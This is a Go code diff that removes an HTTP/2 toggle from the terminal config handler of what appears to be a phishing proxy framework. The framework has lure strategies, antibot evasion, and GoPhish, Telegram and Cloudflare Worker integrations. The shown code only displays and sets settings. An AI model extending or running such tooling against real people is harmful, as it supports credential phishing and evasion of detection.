@@ -243,11 +243,6 @@ func (t *Terminal) handleConfig(args []string) error {
 			autocertOnOff = "on"
 		}
 
-		http2OnOff := "off"
-		if t.cfg.IsHttp2Enabled() {
-			http2OnOff = "on"
-		}
-
 		gophishInsecure := "false"
 		if t.cfg.GetGoPhishInsecureTLS() {
 			gophishInsecure = "true"
@@ -273,10 +268,10 @@ func (t *Terminal) handleConfig(args []string) error {
 		antibotThreshold := fmt.Sprintf("%.2f", t.cfg.GetAntibotConfig().MLThreshold)
 		antibotOverrideIPs := strconv.Itoa(len(t.cfg.GetAntibotConfig().OverrideIPs))
 
-		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "http2_enabled", "lure_strategy", "antibot enabled", "antibot action", "antibot threshold", "antibot override_ips", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
+		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "lure_strategy", "antibot enabled", "antibot action", "antibot threshold", "antibot override_ips", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
 		primaryDomain := t.cfg.GetPrimaryDomain()
 		domainsCount := strconv.Itoa(len(t.cfg.GetDomains()))
-		vals := []string{t.cfg.general.Domain, primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, http2OnOff, lureStrategy, antibotEnabled, antibotAction, antibotThreshold, antibotOverrideIPs, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		vals := []string{t.cfg.general.Domain, primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, lureStrategy, antibotEnabled, antibotAction, antibotThreshold, antibotOverrideIPs, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -336,21 +331,6 @@ func (t *Terminal) handleConfig(args []string) error {
 			case "off":
 				t.cfg.EnableAutocert(false)
 				t.manageCertificates(true)
-				return nil
-			}
-		case "http2":
-			switch args[1] {
-			case "on":
-				t.cfg.EnableHttp2(true)
-				if t.p != nil {
-					t.p.SetHttp2Enabled(true)
-				}
-				return nil
-			case "off":
-				t.cfg.EnableHttp2(false)
-				if t.p != nil {
-					t.p.SetHttp2Enabled(false)
-				}
 				return nil
 			}
 		case "lure_strategy":
